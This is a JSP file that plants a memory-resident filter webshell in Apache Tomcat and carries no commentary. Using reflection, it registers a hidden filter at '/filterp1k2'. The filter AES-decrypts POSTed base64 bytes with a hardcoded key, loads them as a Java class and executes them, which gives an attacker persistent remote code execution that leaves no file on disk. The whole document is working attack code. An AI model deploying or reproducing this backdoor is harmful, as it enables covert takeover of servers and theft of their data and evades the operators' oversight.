<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import = "org.apache.catalina.Context" %>
<%@ page import = "org.apache.catalina.core.ApplicationContext" %>
<%@ page import = "org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import = "org.apache.catalina.core.StandardContext" %>

<!-- tomcat 8/9 -->
<%@page import = "org.apache.tomcat.util.descriptor.web.FilterMap"%>
<%@page import = "org.apache.tomcat.util.descriptor.web.FilterDef"%>

<!-- tomcat 7 -->
<!--org.apache.catalina.deploy.FilterMap"
  " org.apache.catalina.deploy.FilterDef"
-->

<%@ page import = "javax.servlet.*" %>
<%@ page import = "javax.servlet.annotation.WebServlet" %>
<%@ page import = "javax.servlet.http.HttpServlet" %>
<%@ page import = "javax.servlet.http.HttpServletRequest" %>
<%@ page import = "javax.servlet.http.HttpServletResponse" %>
<%@ page import = "java.io.IOException" %>
<%@ page import = "java.lang.reflect.Constructor" %>
<%@ page import = "java.lang.reflect.Field" %>
<%@ page import = "java.lang.reflect.InvocationTargetException" %>
<%@ page import = "java.util.Map" %>
<%@ page import="java.io.PrintWriter" %>


<%
    class InsertFilter implements Filter {
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }

            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            HttpServletResponse rsp = (HttpServletResponse) servletResponse;
            try {
                if (req.getMethod().equals("POST")) {
                    String k = "e45e329feb5d925b";
                    req.getSession().setAttribute("u", k);
                    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                    c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
                    java.util.Map<String, Object> pageContext = new java.util.HashMap<String, Object>();
                    pageContext.put("session", req.getSession());
                    pageContext.put("request", req);
                    pageContext.put("response", rsp);
                    java.io.BufferedReader bf = req.getReader();
                    byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                    String sb = new String(evilClassBytes);
                    Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                    Object a = evilClass.newInstance();
                    a.equals(pageContext);
                    return;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        public void destroy() {}

    }
%>

<%
    String name="InsertFilter";
    //ServletContext servletContext = request.getServletContext();
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if(filterConfigs.get(name) == null){
        InsertFilter insertFilter = new InsertFilter();

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(name);
        filterDef.setFilterClass(insertFilter.getClass().getName());
        filterDef.setFilter(insertFilter);
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/filterp1k2");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);
        //standardContext.removeFilterMap(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        //filterConfigs.remove(name,filterConfig);
        out.write("Inject Success");
    }else{
        out.write("Injected");
    }

%>
